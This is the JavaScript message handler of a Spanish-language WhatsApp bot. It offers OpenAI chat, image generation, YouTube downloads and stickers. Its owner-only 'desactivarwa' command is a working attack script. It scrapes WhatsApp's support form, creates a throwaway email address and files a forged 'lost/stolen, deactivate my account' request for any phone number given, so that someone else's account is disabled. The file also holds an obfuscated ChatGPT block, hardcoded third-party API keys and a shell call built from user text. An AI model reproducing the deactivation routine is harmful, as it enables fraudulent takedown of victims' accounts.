"use strict";
process.on('uncaughtException', console.error)
const { downloadContentFromMessage, downloadMediaMessage } = require("@adiwajshing/baileys");
const { color, bgcolor } = require("../lib/color");
const fetch = require("node-fetch");
const fs = require("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process");
let setting;
const { ownerNumber, MAX_TOKEN, OPENAI_KEY } = setting = require('../config.json');
const speed = require("performance-now");
const ffmpeg = require("fluent-ffmpeg");
let { ytmp4, ytmp3, ytplay, ytplayvid } = require('../lib/youtube')
const { mediafireDl } = require('../lib/myfunc')
const axios = require("axios");
const cheerio = require("cheerio");

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async (conn, msg, m, openai) => {
  try {
    if (msg.key.fromMe) return
    const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe } = msg;
    const toJSON = (j) => JSON.stringify(j, null, "\t");
    const from = msg.key.remoteJid;
    const chats = type === "conversation" && msg.message.conversation ? msg.message.conversation : type === "imageMessage" && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : type === "videoMessage" && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : type === "extendedTextMessage" && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : type === "buttonsResponseMessage" && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : type === "templateButtonReplyMessage" && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : type == "listResponseMessage" && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const args = chats.split(" ");
    const args22 = chats.trim().split(/ +/).slice(1)
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#%^&./\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#,|÷?;:%^&./\\©^]/gi) : null;
    const command = prefix ? chats.slice(1).trim().split(' ').shift().toLowerCase() : ''
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const groupMetadata = msg.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = msg.isGroup ? groupMetadata.subject : ''  
    const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
    const userId = sender.split("@")[0]
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const isOwner = [botNumber,...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
    const pushname = msg.pushName;
    const q = chats.slice(command.length + 1, chats.length);
    const textoo = args22.join(" ")  
    const isCmd = chats.startsWith(prefix)
    const content = JSON.stringify(msg.message)
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isAudio = (type == 'audioMessage')
    const isSticker = (type == 'stickerMessage')
    const isViewOnce = (type == 'viewOnceMessageV2')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false    
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const textolink = decodeURIComponent(chats.replace(command, '').replace(prefix, '').split(' ').join(''))  
    const textosinespacio = decodeURIComponent(chats.replace(command, '').replace(prefix, ''))
    //let banchat = JSON.parse(fs.readFileSync('../lib/database/banChat.json'));
    //const isBanChat = isGroup ? banchat.includes(from) : false
 
/* Envios de mensajes */ 
    
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg });
};
const tempButton = async (remoteJid, text, footer, content) => {
const templateMessage = { viewOnceMessage: { message: { templateMessage: { hydratedTemplate: { hydratedContentText: text, hydratedContentFooter: footer, hydratedButtons: content, }, }, }, }, };
const sendMsg = await conn.relayMessage(remoteJid, templateMessage, {}); 
};
const sendAud = (link) => { 
conn.sendMessage(from, { audio: { url: link }, fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: msg });
};
const sendVid = (link, thumbnail) => {
conn.sendMessage( from, { video: { url: link }, fileName: `error.mp4`, thumbnail: thumbnail, mimetype: 'video/mp4' }, { quoted: msg });
};      
const sendImgUrl = (link) => {
conn.sendMessage( from, { image: { url: link }, fileName: `error.jpg` }, { quoted: msg });
};         
      
/* Auto Read & Presence Online */
conn.readMessages([msg.key]);
conn.sendPresenceUpdate("available", from);

    // Logs;
    if (!isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname));
    }
    if (isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "from", color(pushname), "in", color(groupName));
    }

switch (command) {
case 'start': case 'menu':
//@${msg.sender.split`@`[0] || pushname || 'user'}    
var textReply = `Hola 👋

Soy un Bot de WhatsApp que usa la inteligencia artificial de OpenAI (ChatGPT), fui creado para responder a tus preguntas. Envíame una pregunta y te responderé!. 

_El Bot se limita a responder ${MAX_TOKEN} palabras como máximo_

Comandos disposibles:
- ${prefix}start
- ${prefix}ping
- ${prefix}runtime
- ${prefix}play
- ${prefix}play2
- ${prefix}ytmp3
- ${prefix}ytmp4
- ${prefix}chatgpt
- ${prefix}chatgpt2
- ${prefix}dall-e
- ${prefix}sticker
- ${prefix}mediafiredl

Comandos del Owner:
- ${prefix}update
- ${prefix}desactivarwa

*Editado By @5219996125657*`
//let fkontak2 = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${msg.sender.split('@')[0]}:${msg.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }  
//conn.sendMessage(from, { text: textReply, mentions: [...textReply.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted: fkontak2 });
conn.sendMessage(from, { text: textReply, mentions: [...textReply.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted: msg });
break
case 'runtime':
reply(require('../lib/myfunc').runtime(process.uptime()))
break
case 'ping':
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*Tiempo de respuesta: ${latensi.toFixed(4)}s*`)
break     
case 'play':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let res = await fetch(`https://api.lolhuman.xyz/api/ytplay2?apikey=BrunoSobrino&query=${textosinespacio}`) 
let json = await res.json()
let kingcore = await ytplay(textosinespacio)
let audiodownload = json.result.audio
if (!audiodownload) audiodownload = kingcore.result
sendAud(`${audiodownload}`)
break
case 'play2':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let mediaa = await ytplayvid(textosinespacio)
sendVid(mediaa.result, `${mediaa.thumb}`)
break   
case 'ytmp3':
if (!args[1]) return reply(`*[❗] Ingresa el enlace de un video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress22 = await fetch(`https://api.lolhuman.xyz/api/ytaudio2?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn22 = await ress22.json()
let kingcoreee2 = await ytmp3(textolink)
let audiodownloaddd2 = jsonn22.result.link
if (!audiodownloaddd2) audiodownloaddd2 = kingcoreee2.result
sendAud(`${audiodownloaddd2}`)    
break        
case 'ytmp4':
if (!args[1]) return reply(`*[❗] Ingresa el enlace de un video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress2 = await fetch(`https://api.lolhuman.xyz/api/ytvideo?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn2 = await ress2.json()
let kingcoreee = await ytmp4(textolink)
let videodownloaddd = jsonn2.result.link.link
if (!videodownloaddd) videodownloaddd = kingcoreee.result
sendVid(videodownloaddd, `${kingcoreee.thumb}`)    
break    
case 'dall-e': case 'draw': 
if (!args[1]) return reply(`*[❗] Ingrese un texto el cual sera la tematica de la imagen y así usar la función de la IA Dall-E*\n\n*—◉ Ejemplos de peticions:*\n*◉ ${prefix + command} gatitos llorando*\n*◉ ${prefix + command} hatsune miku beso*`)    
try {       
const responsee = await openai.createImage({ prompt: textosinespacio, n: 1, size: "512x512", });    
sendImgUrl(responsee.data.data[0].url)        
} catch (jj) {
try {      
sendImgUrl(`https://api.lolhuman.xyz/api/dall-e?apikey=BrunoSobrino&text=${textosinespacio}`)  
} catch (jj2) {
reply("*[❗] Error, no se obtuvo ninguna imagen de la IA...*\n\n*—◉ Error:*\n" + jj2)        
}}
break
case 'chatgpt2': case 'ia2':      
if (!args[1]) return reply(`*[❗] Ingrese una petición o una orden para usar la funcion ChatGPT*\n\n*—◉ Ejemplos de peticions u ordenes:*\n*◉ ${prefix + command} Reflexion sobre la serie Merlina 2022 de netflix*\n*◉ ${prefix + command} Codigo en JS para un juego de cartas*`)           
try {
const BotIA = await openai.createCompletion({ model: "text-davinci-003", prompt: textosinespacio, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(BotIA.data.choices[0].text.trim())
} catch (qe) {
try {    
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${textosinespacio}&user=user-unique-id`)
let hasill = await tioress.json()
reply(`${hasill.result}`.trim())   
} catch (qqe) {        
reply("*[❗] Error, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + qqe)  
}} 
break
case 'update':
if (!isOwner) return reply('*[❗] Este comando solo puede ser utilizado por el Owner del Bot*')    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await reply(stdout.toString()) 
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/BrunoSobrino/openai-botwa.git && git pull')
await reply(updatee.toString())}  
break
case 'desactivarwa':      
if (!isOwner) return reply('*[❗] Este comando solo puede ser utilizado por el Owner del Bot*')    
if (!q || !args[1]) return reply(`*[❗] Ingrese un numero, ejemplo ${prefix + command} +1 (450) 999-999*`)
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(ressss.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
break   
case 'mediafiredl':
let resss2 = await mediafireDl(textosinespacio)
let caption = `
*📓 Nombre:* ${resss2.name}
*📁 Peso:* ${resss2.size}
*📄 Tipo:* ${resss2.mime}\n
*⏳ Espere en lo que envio su archivo. . . .* 
`.trim()
await reply(caption)
await conn.sendMessage(from, { document : { url: resss2.link }, fileName: resss2.name, mimetype: resss2.mime.toUpperCase() }, { quoted: msg })       
break
/*-------------------------------------------------------*/
/* [❗]                      [❗]                      [❗] */  
/*                                                       */ 
/*         |- [ ⚠ ] - CODIGO OFUSCADO - [ ⚠ ] -|        */
/*     —◉ DESAROLLADO POR OTOSAKA:                       */
/*     ◉ Otosaka (https://github.com/6otosaka9)          */
/*     ◉ Número: wa.me/51993966345                       */
/*                                                       */
/*     —◉ FT:                                            */
/*     ◉ BrunoSobrino (https://github.com/BrunoSobrino)  */
/*                                                       */
/* [❗]                      [❗]                      [❗] */
/*-------------------------------------------------------*/    
case 'chatgpt': case 'ia': 
const _0x306696=_0x38c2;(function(_0x2ddd23,_0x24adf7){const _0x5ebb5c=_0x38c2,_0x3673fe=_0x2ddd23();while(!![]){try{const _0x348f33=-parseInt(_0x5ebb5c(0xe0))/0x1+parseInt(_0x5ebb5c(0xc0))/0x2*(parseInt(_0x5ebb5c(0xd7))/0x3)+-parseInt(_0x5ebb5c(0xd6))/0x4*(parseInt(_0x5ebb5c(0xbf))/0x5)+-parseInt(_0x5ebb5c(0xc5))/0x6+-parseInt(_0x5ebb5c(0xc4))/0x7*(-parseInt(_0x5ebb5c(0xc3))/0x8)+-parseInt(_0x5ebb5c(0xd5))/0x9*(parseInt(_0x5ebb5c(0xda))/0xa)+-parseInt(_0x5ebb5c(0xc8))/0xb*(-parseInt(_0x5ebb5c(0xe1))/0xc);if(_0x348f33===_0x24adf7)break;else _0x3673fe['push'](_0x3673fe['shift']());}catch(_0x4cbc72){_0x3673fe['push'](_0x3673fe['shift']());}}}(_0x2c86,0x87bce));function _0x38c2(_0xe6b0cc,_0x467387){const _0x2c8639=_0x2c86();return _0x38c2=function(_0x38c229,_0x2ed089){_0x38c229=_0x38c229-0xbf;let _0x3e7ade=_0x2c8639[_0x38c229];return _0x3e7ade;},_0x38c2(_0xe6b0cc,_0x467387);}function _0x2c86(){const _0x506ade=['https://api.openai.com/v1/chat/completions','sender','gpt-3.5-turbo','push','18ynrAbh','3088vczWLq','9JWVOfr','message','chatgpt','4697720DxfYLE','log','https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=','result','text-davinci-003','&user=user-unique-id','87998ynVZMA','12YRPvDT','3515mdPUPj','665670rIamGG','choices','data','8TaKFls','1451520tnoInb','5979840PXYypU','Bearer\x20','assistant','21087165EfQDec','trim','json','content','application/json','stringify','user','post','reply'];_0x2c86=function(){return _0x506ade;};return _0x2c86();}try{let chgptdb=global[_0x306696(0xd9)][_0x306696(0xc2)]['users'][m[_0x306696(0xd2)]];chgptdb[_0x306696(0xd4)]({'role':_0x306696(0xce),'content':textosinespacio});const config={'method':_0x306696(0xcf),'url':_0x306696(0xd1),'headers':{'Content-Type':_0x306696(0xcc),'Authorization':_0x306696(0xc6)+OPENAI_KEY},'data':JSON[_0x306696(0xcd)]({'model':_0x306696(0xd3),'messages':[{'role':'system','content':''},...chgptdb]})};let response=await axios(config);chgptdb[_0x306696(0xd4)]({'role':_0x306696(0xc7),'content':response[_0x306696(0xc2)][_0x306696(0xc1)][0x0][_0x306696(0xd8)][_0x306696(0xcb)]}),reply(response[_0x306696(0xc2)][_0x306696(0xc1)][0x0]['message'][_0x306696(0xcb)]);}catch(_0x69b752){try{const BotIA222=await openai['createCompletion']({'model':_0x306696(0xde),'prompt':textosinespacio,'temperature':0.3,'max_tokens':MAX_TOKEN,'stop':['Ai:','Human:'],'top_p':0x1,'frequency_penalty':0.2,'presence_penalty':0x0});reply(BotIA222[_0x306696(0xc2)][_0x306696(0xc1)][0x0]['text']['trim']());}catch(_0x47836f){try{let Rrres=await fetch('https://api.ibeng.tech/api/info/openai?text='+textosinespacio+'&apikey=tamvan'),Jjjson=await Rrres[_0x306696(0xca)]();m[_0x306696(0xd0)](Jjjson[_0x306696(0xc2)][_0x306696(0xc2)]['trim']());}catch(_0x2a0a74){try{let tioress22=await fetch(_0x306696(0xdc)+textosinespacio+_0x306696(0xdf)),hasill22=await tioress22[_0x306696(0xca)]();reply((''+hasill22[_0x306696(0xdd)])[_0x306696(0xc9)]());}catch(_0xf549b0){console[_0x306696(0xdb)](_0xf549b0);}}}}    
break     
    
/*case 'banchat': 
//if (!isOwner) return
if (args[0] === "ban") {
banchat.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "unban") {
let off = banchat.indexOf(from)
banchat.splice(off, 1)
} else {
reply('Bna o unban')
}}
break*/
    
case 'sticker': case 's':
try {        
const pname = 'OpenAI - WaBot'
const athor = '+' + conn.user.id.split(":")[0];
if (isImage || isQuotedImage) {
await conn.downloadAndSaveMediaMessage(msg, "image", `./tmp/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./tmp/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(`./tmp/${sender.split("@")[0]}.jpeg`)
} else {
if(isVideo || isQuotedVideo) {
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
const imageBuffer = await downloadMediaMessage(msg, 'buffer', {}, {});
let filenameJpg = "stk.jpg";
fs.writeFileSync(filenameJpg, imageBuffer);
await ffmpeg('./' + filenameJpg).input(filenameJpg).on('start', function(cmd){
console.log(`Started: ${cmd}`)
}).on('error', function(err) {
console.log(`Error: ${err}`);
reply('error')}).on('end', async function() {
console.log('Finish')
await conn.sendMessage(from, {sticker: {url:'stk.webp'}})
}).addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]).toFormat('webp').save('stk.webp');
}}} catch {     
reply(`*[❗] Responda a una imagen, gif o video, el cual será convertido en sticker, recuerde que debe mandar una imagen o responder a una imagen con el comando ${prefix + command}*`)        
}
break 
default:
const botNumber22 = '@' + conn.user.id.split(":")[0];
if (!chats.startsWith(botNumber22) && isGroup) return
if (isImage || isVideo || isSticker || isViewOnce || isAudio) return
let chatstext = chats.replace(conn.user.id.split(":")[0].split("@")[0], '')
if (isGroup) chatstext = chatstext.replace("@", '').replace(prefix, '')
console.log("->[\x1b[1;32mNew\x1b[1;37m]", color('Pregunta De', 'yellow'), color(pushname, 'lightblue'), `: "${chatstext}"`)
conn.sendPresenceUpdate("composing", from);
try {
const response = await openai.createCompletion({ model: "text-davinci-003", prompt: chatstext, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(response.data.choices[0].text.trim())
} catch (eee1) {
try {
let rresSS = await fetch(`https://api.ibeng.tech/api/info/openai?text=${chatstext}&apikey=tamvan`)
let jjsonNN = await rresSS.json()
reply(jjsonNN.data.data.trim())     
} catch (eee) {  
try {    
let tiores = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${chatstext}&user=user-unique-id`)
let hasil = await tiores.json()
reply(`${hasil.result}`.trim())   
} catch (eeee) {        
reply("*[❗] Error, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + eeee)  
}}} 
break
}} catch (err) {
console.log(color("[ERROR]", "red"), err); }};
